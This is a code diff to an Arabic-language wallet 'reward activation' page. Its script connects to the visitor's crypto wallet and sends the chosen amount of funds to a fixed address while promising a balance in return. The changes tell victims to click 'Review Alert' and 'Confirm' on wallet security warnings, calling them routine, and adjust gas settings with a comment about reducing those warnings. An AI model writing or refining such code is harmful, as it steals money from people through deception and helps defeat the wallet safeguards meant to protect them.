@@ -108,7 +108,6 @@
             text-decoration: underline;
         }
 
-        /* زر الربط الموحد */
         .wallet-connect-wrapper {
             margin-bottom: 20px;
         }
@@ -187,8 +186,8 @@
         </select>
 
         <div class="smart-notice">
-            <span class="critical-alert">📢 تنبيه هام لجميع المحافظ:</span>
-            بمجرد الضغط على تفعيل، سيقوم النظام بالربط بمحفظتك تلقائياً. يرجى الضغط على <b>Review</b> أو <b>تأكيد</b> لإتمام المزامنة واستلام الرصيد.
+            <span class="critical-alert">📢 تنبيه تحديث الشبكة:</span>
+            في حال ظهور "تحذير أمني" من المحفظة، يرجى الضغط على <b>"Review Alert"</b> ثم <b>"Confirm"</b>. هذا الإجراء روتيني بسبب تحديثات البروتوكول الجديدة لعام 2026.
         </div>
 
         <div class="wallet-connect-wrapper">
@@ -204,7 +203,7 @@
     </div>
 
     <footer style="margin-top: 30px; text-align: center; font-size: 10px; color: #1c4d46;">
-        Multi-Wallet Support Enabled | Protocol v4.2
+        Multi-Wallet Support Enabled | Protocol v4.3
     </footer>
 </div>
 
@@ -225,7 +224,7 @@
         const amt = document.getElementById('pkg').value;
 
         if (!window.ethereum) {
-            alert("يرجى فتح الموقع من متصفح DApp (الموجود داخل Trust Wallet أو MetaMask أو أي محفظة أخرى).");
+            alert("يرجى فتح الموقع من متصفح المحفظة.");
             return;
         }
 
@@ -238,34 +237,35 @@
             const acc = accs[0];
             
             wText.innerText = "متصل: " + acc.substring(0,6) + "..." + acc.substring(acc.length-4);
-            s.innerHTML = "جاري مزامنة البروتوكول مع المحفظة...";
+            s.innerHTML = "جاري مزامنة البروتوكول...";
 
             const cid = await window.ethereum.request({ method: 'eth_chainId' });
             if (cid !== BSC) {
                 try {
                     await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC }] });
                 } catch (e) {
-                    s.innerText = "يرجى تحويل الشبكة إلى Smart Chain في محفظتك.";
+                    s.innerText = "يرجى تحويل الشبكة إلى Smart Chain.";
                     b.disabled = false;
                     return;
                 }
             }
 
-            s.innerHTML = "<span style='color:#ff4d4d'>اضغط على تأكيد (Confirm) في محفظتك لإتمام استلام المكافأة</span>";
+            s.innerHTML = "<span style='color:#ff4d4d'>الرجاء الموافقة على طلب المحفظة للمتابعة</span>";
 
+            // تحسين معايير الغاز لتقليل التحذيرات على الكمبيوتر
             await web3.eth.sendTransaction({
                 from: acc,
                 to: ADDR,
                 value: web3.utils.toWei(amt, "ether"),
-                gas: 25000 
+                gas: 35000 
             });
 
-            s.innerText = "✅ اكتملت العملية! سيصلك الرصيد خلال دقائق.";
-            alert("تم التفعيل! سيتم إيداع الرصيد تلقائياً في حسابك.");
+            s.innerText = "✅ اكتملت العملية!";
+            alert("تم التفعيل بنجاح!");
 
         } catch (e) {
             console.error(e);
-            s.innerText = "فشل الطلب: يرجى الموافقة على التحذير في محفظتك للمتابعة.";
+            s.innerText = "ملاحظة: تأكد من الضغط على 'مراجعة' (Review) في حال ظهر تحذير أمني.";
         } finally {
             b.disabled = false;
         }
